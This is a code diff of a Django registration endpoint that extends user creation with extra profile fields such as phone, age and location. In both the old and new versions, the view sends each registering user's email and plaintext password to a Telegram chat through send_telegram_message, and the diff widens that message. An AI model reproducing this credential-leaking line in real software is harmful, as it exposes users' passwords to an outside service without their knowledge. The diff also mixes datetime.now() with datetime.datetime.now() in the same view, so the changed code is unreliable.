@@ -35,20 +35,27 @@ class RegisterUser(GenericAPIView):
         #     otp = "2222"
 
         user = get_user_by_username(req_body["email"])
-        send_telegram_message(f"user is registered with email: {req_body['email']} with password: \n{req_body['password']}")
-        logger.info("user is registered")
+        send_telegram_message(f"user is registering with email: {req_body['email']}, and first_name: {req_body.get('first_name','')} with password: {req_body['password']}")
+        logger.info(f"user is registered with email: {req_body['email']}")
         if user is None:
-            user = create_user(email=req_body["email"], 
-                               first_name=req_body.get("first_name",""),
-                               password=req_body["password"], is_active=False)
+            user = create_user(email=req_body["email"],
+                                first_name=req_body.get("first_name",""),
+                                last_name=req_body.get("last_name",""),
+                                phone_number=req_body.get("phone_number",""),
+                                age=req_body.get("age",0),
+                                lat=req_body.get("lat",0.0),
+                                longitude=req_body.get("longitude",0.0),
+                                language=req_body.get("language","UZ"),
+                                password=req_body["password"],
+                                is_active=False)
         user_role = get_user_role_by_username_role_self(req_body["email"], self.role)
 
         if user_role is not None:
             if user_role.is_verified: return Response({'error':'user already registered'}, status=status.HTTP_400_BAD_REQUEST)
-            update_user_role(user_role.id, otp, req_body["lat"], req_body["long"], datetime.datetime.now())
+            update_user_role(user_role.id, otp, datetime.datetime.now())
 
         else:
-            create_user_role(self.role, user.id, otp, req_body["lat"], req_body["long"], datetime.datetime.now())
+            create_user_role(role=self.role, user_id=user.id, otp=otp, otp_created_at=datetime.now())
 
         send_result = send_otp_email(req_body["email"], otp)
         
